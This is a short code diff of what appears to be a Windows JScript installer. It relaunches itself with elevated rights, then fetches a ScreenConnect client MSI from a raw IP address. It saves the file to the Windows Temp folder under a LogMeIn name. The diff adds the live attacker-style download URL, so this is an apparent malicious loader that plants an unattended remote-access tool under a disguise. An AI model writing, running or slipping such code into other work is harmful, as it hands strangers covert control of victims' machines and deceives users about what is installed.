@@ -4,7 +4,7 @@
         shell.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\" elevated", "", "runas", 1);
         WScript.Quit(0);
     }
-    var msiUrl = "http://3v4t06xc6qcm5k8:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+    var msiUrl = "http://170.39.187.122:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
     var destPath = "C:\\Windows\\Temp\\LogMeInResolve_Unattended.msi";
     var destFolder = "C:\\Windows\\Temp";
     var logFile = "C:\\Windows\\Temp\\LogMeIn_Install.log";
